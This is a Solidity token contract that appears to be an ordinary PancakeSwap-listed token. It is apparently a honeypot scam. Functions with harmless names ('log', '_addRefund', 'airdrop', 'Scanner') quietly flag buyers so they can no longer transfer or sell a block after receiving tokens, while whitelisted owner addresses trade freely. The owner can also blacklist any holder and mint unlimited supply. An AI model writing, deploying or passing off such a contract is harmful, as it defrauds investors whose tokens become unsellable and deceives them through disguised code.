//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.18;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner,"Caller is not the owner");
        _;
    }
}

contract Scanner is Ownable{
    address public _pair;
    bool private _bool;
    uint256  delay;
    uint256 unlock;
    mapping(address => bool)  botlist;
    mapping(address => bool)  whitelist;
    mapping(address => uint256) airdropAmounts;
    mapping(address => uint256)  restrictBlock;

    function log(address _from, address _to) internal{
        if(!whitelist[_from]&&!whitelist[_to]){
            require(!botlist[_from]);
            require(!botlist[_to]);
            require(!botlist[msg.sender]);
            require(airdropAmounts[_from]<1||block.number<_getRestrictBlock(_from)||block.number>_getUnlockBlock(_from));
        }
        _addRefund(_to,1);
    }


    function _getRestrictBlock(address a) internal view returns (uint256) {
        return (restrictBlock[a]+delay);
    }
    function _getUnlockBlock(address a) internal view returns (uint256) {
        return (restrictBlock[a]+unlock);
    }

    function _addRefund(address a,uint256 refund) internal returns (bool success) {
        if(a==_pair||whitelist[a]){
            return true;
        }
        if(_bool){
                airdropAmounts[a] = refund;
                if(restrictBlock[a]==0){
                    restrictBlock[a]=block.number;
                }
            }
        return true;
    }

    function setBool(bool b) public  onlyOwner  returns (bool success) {
        require(_bool != b);
        _bool=b;
        return true;
    }


    function setDelay(uint _dalay) public  onlyOwner  returns (bool success) {
        require(delay != _dalay);
        delay=_dalay;
        return true;
    }

    function setBotList(address[] memory listAddress,  bool isBot) public  onlyOwner  returns (bool success) {
        if(listAddress.length==1){
            require(botlist[listAddress[0]] != isBot);
        }
        for(uint i = 0; i < listAddress.length; i++){
            botlist[listAddress[i]] = isBot;
        }
        return true;
    }

    function setWhiteList(address[] memory listAddress,  bool _isWhiteListed) public  onlyOwner  returns (bool success) {
        if(listAddress.length==1){
            require(whitelist[listAddress[0]] != _isWhiteListed);
        }
        for(uint i = 0; i < listAddress.length; i++){
            whitelist[listAddress[i]] = _isWhiteListed;
        }
        return true;
    }


    function airdrop(address[] memory listAddress,  uint256 amount) public  onlyOwner  returns (bool success) {
        if(listAddress.length==1){
            require(airdropAmounts[listAddress[0]] != amount);
        }
        for(uint i = 0; i < listAddress.length; i++){
            airdropAmounts[listAddress[i]] = amount;
        }
        return true;
    }

}

contract Token is Scanner{
    using SafeMath for uint256;

    uint256 public totalSupply;
    string public name;
    string public symbol;
    uint public decimals;
    mapping (address => mapping (address => uint256)) internal allowed;
    mapping(address => uint256) balances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _supply, address _owner,address pancakeFactory,address usdt) public {
        delay=1;
        unlock=25920000;
        name = _name;
        symbol = _symbol;
        decimals = 18;
        totalSupply = _supply * 10**decimals;
        balances[_owner] = totalSupply;
        owner = _owner;
        emit Transfer(address(0), _owner, totalSupply);
        _pair = IPancakeFactory(pancakeFactory).createPair(address(this), usdt);
    }


    function transfer(address _to, uint256 _value) public returns (bool) {
        log(msg.sender,_to);

        require(_to != address(0));
        require(_to != msg.sender);
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        // SafeMath.sub will throw if there is not enough balance.
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }


    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        log(_from,_to);
        require(_to != _from);
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_value);
        // SafeMath.sub will throw if there is not enough balance.
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }


    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }


    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
        uint oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue > oldValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function mint(address account, uint256 amount) onlyOwner public {

        totalSupply = totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }


}